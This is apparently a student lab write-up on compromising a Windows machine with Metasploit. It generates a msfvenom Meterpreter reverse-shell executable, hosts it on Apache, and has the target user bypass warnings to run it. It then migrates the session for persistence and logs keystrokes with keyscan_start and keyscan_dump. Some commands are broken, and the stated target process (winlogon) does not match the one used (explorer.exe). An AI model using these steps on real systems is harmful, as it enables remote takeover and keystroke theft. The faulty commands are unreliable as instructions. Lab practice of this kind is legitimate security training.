# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
PROGRAM: Find the attackers ip address using ifconfig
![Screenshot 2025-04-19 140534](https://github.com/user-attachments/assets/fc5d6892-8ae7-4444-98dd-35e8b8b6e698)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe copy the fun.exe into the apache /var/www/html folder Start apache server sudo systemctl apache2 start Check the status of apache2 sudo apache2 status
## output:
![Screenshot 2025-04-19 142126](https://github.com/user-attachments/assets/3df01d98-0aab-49b5-b347-4107bd914b23)
Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole. Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

## output:
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![431915762-729dc34c-b5b1-4cc6-8770-22d2331caede](https://github.com/user-attachments/assets/9d271d68-4a2f-453c-ac8b-8bca86c8b4bb)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
![431915851-d93cac14-3fc3-444b-8159-bc2e0bc66d3a](https://github.com/user-attachments/assets/f2ca75f7-2887-4336-ae2e-12c6013105cb)
migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![431915958-2cfb6dd1-773b-4b42-9cd5-6cbb204a3145](https://github.com/user-attachments/assets/5648e16b-3be2-4722-806d-4ddfbe014106)


Post Exploitation: The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump Shows the keystrokes captured so far 

![431916021-0810a377-a529-4f89-896e-af33fad9b043](https://github.com/user-attachments/assets/b5f08410-8ba5-4300-9044-0611f4724bbb)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
